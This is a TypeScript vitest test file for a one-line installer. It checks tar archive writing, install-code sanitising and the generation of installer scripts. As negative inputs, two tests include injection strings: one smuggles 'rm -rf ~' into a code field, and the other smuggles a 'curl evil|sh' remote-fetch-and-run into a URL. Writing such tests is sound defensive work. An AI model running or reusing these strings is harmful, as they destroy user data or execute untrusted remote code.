import { execFileSync } from 'node:child_process'
import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { gzipSync } from 'node:zlib'

import { describe, expect, it } from 'vitest'

import { cleanCode, installScript, tar } from './installer.ts'

describe('the one-line installer', () => {
  it('writes a tar that tar itself reads back, long paths too', () => {
    const long = `out/gateway/assets/${'deep/'.repeat(20)}chunk-CE7XjLmY.js`
    const dir = mkdtempSync(join(tmpdir(), 'atlas-tar-'))
    writeFileSync(join(dir, 'p.tgz'), gzipSync(tar([{ name: 'package.json', data: Buffer.from('{"name":"x"}') }, { name: long, data: Buffer.from('export {}') }])))
    const list = execFileSync('tar', ['-tzf', 'p.tgz'], { cwd: dir, encoding: 'utf8' }).trim().split(/\r?\n/)
    expect(list).toEqual(['package/package.json', `package/${long}`])
    execFileSync('tar', ['-xzf', 'p.tgz'], { cwd: dir })
    expect(readFileSync(join(dir, 'package', 'package.json'), 'utf8')).toBe('{"name":"x"}')
  })

  it('takes only a code that looks like one (it goes inside a script)', () => {
    expect(cleanCode('abcd-efgh')).toBe('ABCD-EFGH')
    expect(cleanCode("';rm -rf ~")).toBeNull()
    expect(cleanCode(null)).toBeNull()
  })

  it('fills in this Atlas and the code, and refuses an unusual address', () => {
    const ps = installScript('ps1', 'https://atlas.example.com', 'ABCD-EFGH')
    expect(ps).toContain("$Brain = 'https://atlas.example.com'")
    expect(ps).toContain("$Code = 'ABCD-EFGH'")
    expect(ps).toContain('$Brain/hands/atlas-hands.tgz')
    const sh = installScript('sh', 'http://192.168.1.5:47800', 'ABCD-EFGH')
    expect(sh).toContain("BRAIN='http://192.168.1.5:47800'")
    expect(() => installScript('sh', "http://x';curl evil|sh;'", 'ABCD')).toThrow()
  })
})
